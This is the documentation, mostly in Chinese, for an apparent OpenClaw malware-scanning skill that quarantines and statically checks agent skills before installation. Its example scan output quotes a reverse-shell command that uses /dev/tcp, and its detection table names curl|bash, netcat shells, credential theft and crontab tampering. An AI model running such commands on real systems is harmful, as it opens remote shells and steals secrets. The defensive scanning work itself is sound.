---
name: bomb-dog-sniff
version: 1.2.0
description: |
  Security-first skill management for OpenClaw - like a bomb-sniffing dog for skills.
  Sniffs out malicious payloads (crypto stealers, keyloggers, reverse shells) before installation.
  Quarantine → Scan → Install only the safe ones.
author: OpenClaw Security Team
homepage: https://github.com/openclaw/skills/bomb-dog-sniff
---

# bomb-dog-sniff v1.2.0 🐕

**像一只嗅探炸弹的狗一样，用于检测 OpenClaw 中的恶意代码**

在恶意代码对您的系统造成损害之前，及时发现并清除它们。系统会先对代码进行隔离、扫描，然后仅安装安全的代码。

## v1.2.0 的新功能

### 安全性增强
- **修复了下载功能中的命令注入漏洞**
- **增加了路径遍历保护**——对所有路径输入进行清理
- **安全的隔离机制**——使用随机化的目录名并限制目录权限
- **检测二进制文件**——跳过二进制文件以避免误报
- **文件大小限制**——防止通过大文件发起的拒绝服务攻击（DoS）
- **防止重新发起拒绝服务攻击（ReDoS）**——限制长字符串中的正则表达式处理

### 检测能力提升
- **智能降低误报率**——采用更智能的上下文感知模式匹配
- **熵分析**——能够检测到被编码或加密的恶意载荷
- **识别测试文件**——降低测试文件中发现的威胁的严重性
- **提供置信度评分**——每个检测结果都带有置信度等级（高/中/低）
- **新增了 13 个检测类别**——包括供应链攻击、原型污染和恶意脚本检测

### 新的检测模式
- 供应链攻击指标（如域名抢注、动态依赖项）
- 原型污染漏洞
- 恶意 npm/yarn 脚本
- 浏览器凭证窃取
- SSH 密钥窃取
- systemd 持久化机制

## 快速入门

```bash
# Sniff out threats before installing
openclaw skill bomb-dog-sniff scan ./downloaded-skill

# Safe install from clawhub (auto-downloads, sniffs, installs if clean)
openclaw skill bomb-dog-sniff safe-install cool-skill

# Audit an already-installed skill
openclaw skill bomb-dog-sniff audit bird

# Batch scan multiple skills
openclaw skill bomb-dog-sniff batch skills-to-audit.txt
```

## 命令

### scan
扫描代码目录以检测恶意模式。

```bash
openclaw skill bomb-dog-sniff scan <path> [options]

Options:
  -j, --json          Output JSON only
  -v, --verbose       Show detailed findings
  -t, --threshold N   Set risk threshold (default: 40)
  -h, --help          Show help
```

**示例：**
```bash
openclaw skill bomb-dog-sniff scan ./untrusted-skill
openclaw skill bomb-dog-sniff scan -j ./untrusted-skill > report.json
```

**输出：**
```
🔍 Bomb-Dog-Sniff Security Scanner v1.2.0
Target: /home/user/skills/untrusted-skill

🔴 CRITICAL (2)
──────────────────────────────────────────────────
  crypto_harvester: scripts/wallet.js:23
    Crypto wallet private key harvesting detected
    Code: const privateKey = "a1b2c3..."
    Confidence: high

  reverse_shell: scripts/backdoor.sh:5
    Reverse shell or remote code execution detected
    Code: bash -i >& /dev/tcp/192.168.1.100/4444
    Confidence: high

🟠 HIGH (1)
──────────────────────────────────────────────────
  pipe_bash: install.sh:12
    Dangerous curl | bash pattern detected
    Confidence: high

═══════════════════════════════════════════════════
SCAN SUMMARY
═══════════════════════════════════════════════════
☠️ Risk Score: 75/100
   Risk Level: MALICIOUS
   Duration: 125ms
   Files Scanned: 12/15
   Files Skipped: 3 (binary/empty/large)
   Findings: 3

   Severity Breakdown:
     🔴 CRITICAL: 2
     🟠 HIGH: 1

📋 Recommendation:
   MALICIOUS - Do not install. Found 3 critical security issues.

Scan ID: bds-20260208-a1b2c3d4
```

### safe-install
从 clawhub/GitHub 下载代码，扫描后仅安装安全的代码。

```bash
openclaw skill bomb-dog-sniff safe-install <source> [options]

Source:
  - ClawHub skill name: bird
  - GitHub URL: https://github.com/user/skill
  - Local path: ./local-skill

Options:
  --threshold N   Set risk threshold (default: 39)
  --dry-run       Scan only, don't install
  --verbose       Show all findings
```

**示例：**
```bash
# Install with default threshold (39)
openclaw skill bomb-dog-sniff safe-install bird

# Stricter threshold
openclaw skill bomb-dog-sniff safe-install cool-skill --threshold 20

# Scan only (dry run)
openclaw skill bomb-dog-sniff safe-install unknown-skill --dry-run

# GitHub source
openclaw skill bomb-dog-sniff safe-install https://github.com/user/cool-skill
```

### audit
审计已安装的代码。

```bash
openclaw skill bomb-dog-sniff audit <skill-name> [options]
```

**示例：**
```bash
openclaw skill bomb-dog-sniff audit notion
```

### batch
从列表文件中批量扫描多个代码。

**示例列表文件（skills.txt）：**
```
# My installed skills to audit
bird
notion
gog
slack
./custom-skill

# Commented lines are ignored
# old-skill
```

**运行方式：**
```bash
openclaw skill bomb-dog-sniff batch skills.txt
```

## 检测类别

bomb-dog-sniff 可检测以下威胁类别：

| 类别 | 严重性 | 检测到的示例 |
|----------|----------|-------------------|
| **crypto_harvester** | 严重（CRITICAL） | 私钥提取、钱包导出、助记词窃取 |
| **credential_theft** | 严重（CRITICAL） | 环境变量泄露、配置文件窃取、SSH 密钥窃取 |
| **reverse_shell** | 严重（CRITICAL） | Netcat shell、/dev/tcp/ 重定向、基于套接字的 shell、远程代码执行 |
| **keylogger** | 严重（CRITICAL） | 键盘记录、剪贴板内容窃取、密码字段监控 |
| **encoded_payload** | 高风险（HIGH） | Base64 编码的执行链、hex 转义、混淆代码 |
| **suspicious_api** | 高风险（HIGH） | Pastebin/ngrok/webhook 目标地址、包含敏感信息的动态 URL 构建 |
| **pipe_bash** | 高风险（HIGH） | `curl \| bash`、`wget \| sh` 模式 |
| **deposit_scam** | 高风险（HIGH） | “将 ETH 发送到 0x...”的支付提示 |
| **supply_chain** | 高风险（HIGH） | 域名抢注、动态依赖项、可疑的 postinstall 脚本 |
| **prototype_pollution** | 高风险（HIGH） | 危险的对象合并、`__proto__` 操作 |
| **malicious_script** | 严重（CRITICAL） | 安装前后执行网络操作或修改其他包 |
| **network_exfil** | 中等风险（MEDIUM） | 读取文件后进行网络传输 |
| **file_tamper** | 严重（CRITICAL） | 修改 `.bashrc` 文件、编辑 crontab、操纵 SSH authorized_keys |

## 风险评分

```
0-19   SAFE        ✅ Install freely
20-39  LOW         ⚠️  Review recommended
40-69  SUSPICIOUS  🚫 Blocked by default
70-100 MALICIOUS   ☠️  Never install
```

每个检测结果都会增加相应的分数：
- 严重（CRITICAL）：+25 分（× 置信度系数）
- 高风险（HIGH）：+15 分（× 置信度系数）
- 中等风险（MEDIUM）：+5 分（× 置信度系数）

置信度系数：
- 高置信度：1.0×
- 中等置信度：0.75×
- 低置信度：0.5×

总分上限为 100 分。

## 工作原理

### 安全安装流程

```
1. QUARANTINE
   └── Skill downloaded to /tmp/bds-q-<random>/
   └── Randomized, non-predictable directory name
   └── Restricted permissions (0o700)
   
2. SCAN
   ├── Check all files against detection patterns
   ├── Skip binary files, empty files, files >10MB
   ├── Calculate entropy for encoded payload detection
   ├── Apply confidence multipliers
   └── Generate findings report
   
3. DECISION
   ├── Risk > threshold? → BLOCK & DELETE
   └── Risk ≤ threshold? → PROCEED
   
4. INSTALL (if passed)
   └── Move from quarantine to skills directory
   └── Backup existing installation (max 5 backups)
   
5. CLEANUP
   └── Securely remove quarantine directory
```

### 扫描细节
- **仅进行静态分析**——不执行任何代码
- **多模式匹配**——支持 60 多种检测模式
- **逐行报告**——每个检测结果都会显示具体的文件和行号
- **降低误报率**——采用上下文感知的模式匹配
- **自动跳过二进制文件**  
- **防止符号链接循环**——跟踪访问过的文件节点
- **限制扫描深度**——最多扫描 20 层目录
- **处理测试文件**——降低测试文件的威胁等级

## 配置

### 环境变量

```bash
# Set custom skills directory
export OPENCLAW_SKILLS_DIR=/path/to/skills

# Set default risk threshold
export BOMB_DOG_THRESHOLD=25
```

### 单个代码的配置

在代码的 `package.json` 文件中进行配置：

```json
{
  "bomb-dog-sniff": {
    "riskThreshold": 25,
    "excludedCategories": ["network_exfil"]
  }
}
```

## 集成到持续集成/持续部署（CI/CD）流程

将 bomb-dog-sniff 集成到您的 CI/CD 流程中：

```yaml
# .github/workflows/skill-security.yml
name: Skill Security Scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Scan skills
        run: |
          for skill in skills/*/; do
            echo "Scanning $skill"
            node skills/bomb-dog-sniff/scan.js "$skill" || exit 1
          done
```

**退出代码说明：**
- `0`：安全（分数低于阈值）
- `1`：错误/参数无效
- `2`：存在风险（分数高于阈值）

## 程序化 API

```javascript
const { scanSkill } = require('./scan');
const { safeDownload } = require('./safe-download');

// Scan a skill
const report = scanSkill('./path/to/skill', { verbose: true });
console.log(`Risk score: ${report.riskScore}`);
console.log(`Findings: ${report.findings.length}`);

// Safe download and install
const result = await safeDownload('cool-skill', {
  autoInstall: true,
  riskThreshold: 30,
});

if (!result.success) {
  console.error('Installation blocked:', result.reason);
}
```

## 安全限制

为防止拒绝服务攻击（DoS）并确保扫描工具的安全性，我们设置了以下限制：

| 限制 | 值 | 目的 |
|-------|-------|---------|
| 最大文件大小 | 10MB | 防止内存耗尽 |
| 最大行长度 | 10KB | 防止重新发起拒绝服务攻击 |
| 每次扫描的最大文件数量 | 10,000 个 | 防止资源耗尽 |
| 每个文件的最大检测结果数量 | 100 个 | 防止输出信息过多 |
| 总检测结果数量 | 500 个 | 防止结果堆积 |
| 最大目录深度 | 20 层 | 防止无限递归 |
| 下载超时 | 2 分钟 | 防止下载失败 |
| 最大下载文件大小 | 50MB | 防止磁盘空间耗尽 |

## 误报处理

如果合法代码触发了警告：
1. **检查置信度等级**——置信度较低的检测结果更有可能是误报
2. **查看被标记的代码片段**——仔细检查被标记的代码
3. **测试文件会被特别处理**——在 `*.test.js` 或 `__tests__` 目录中发现的检测结果会被降低严重性
4. **通常会跳过注释**——除非注释中包含可疑内容

如需报告误报，请提供以下信息：
- 触发误报的文件内容
- 匹配到的检测模式
- 预期的行为

## 最佳实践
1. **在安装任何未知代码之前务必先进行扫描**
2. **对于不可信的来源，先使用 `--dry-run` 命令进行测试**
3. **为关键系统设置较低的阈值（例如 `--threshold 20`）
4. **定期审计**——定期重新扫描已安装的代码
5. **务必处理严重级别的警告**——切勿忽略任何严重性的检测结果
6. **关注置信度等级**——置信度越高，优先级越高

## 相关文件
- `SKILL.md`：本文档
- `scan.js`：核心扫描引擎
- `patterns.js`：检测模式定义
- `safe-download.js`：安全下载和安装逻辑
- `scripts/sniff.sh`：命令行接口（CLI）包装器
- `package.json`：包配置文件
- `QUICKSTART.md：快速参考指南

## 安全注意事项

⚠️ **限制：**
- 仅进行静态分析（某些混淆技术可能逃避检测）
- 基于模式的检测方式（新型攻击可能无法被识别）
- 不能替代对关键系统进行的手动代码审查
- 无法检测运行时的恶意行为

### 建议：
- 将 bomb-dog-sniff 作为第一道防线
- 对高安全性的系统，手动审查代码
- 定期更新 `patterns.js` 文件以适应新的威胁
- 如发现误报或漏检，请及时报告
- 结合其他安全工具进行深度防御

## 更新日志

### v1.2.0（增强版）
- **安全性改进**：修复了 `safe-download.js` 中的命令注入漏洞
- **安全性改进**：增加了路径遍历保护
- **安全性改进**：实现了安全的随机化隔离机制
- **新增功能**：支持二进制文件检测和跳过
- **新增功能**：设置了文件大小限制（每个文件最大 10MB，总下载大小 50MB）
- **新增功能**：对编码载荷进行熵分析
- **新增功能**：为所有检测结果提供置信度评分
- **新增功能**：识别测试文件并降低其威胁等级
- **新增功能**：新增了 3 个检测类别
- **性能提升**：通过上下文感知机制降低了误报率
- **性能提升**：通过限制长字符串长度来防止重新发起拒绝服务攻击
- **性能提升**：增加了符号链接循环的保护机制
- **性能提升**：实现了备份机制（最多保存 5 个备份）

### v1.1.0
- 新增了 `safe-install` 命令，支持隔离流程
- 新增了 `audit` 命令，用于审计已安装的代码
- 新增了 `batch` 命令，用于批量扫描代码
- 检测模式得到了增强（增加了 50 多种检测规则）
- 新增了风险阈值配置选项

### v1.0.0
- 初始版本，具备基本的扫描功能
- 支持 10 个检测类别
- 输出格式为 JSON

## 许可证

MIT 许可证——详见 LICENSE 文件

---

**保持安全。全面扫描。仅信任经过验证的代码。** 🦞🐕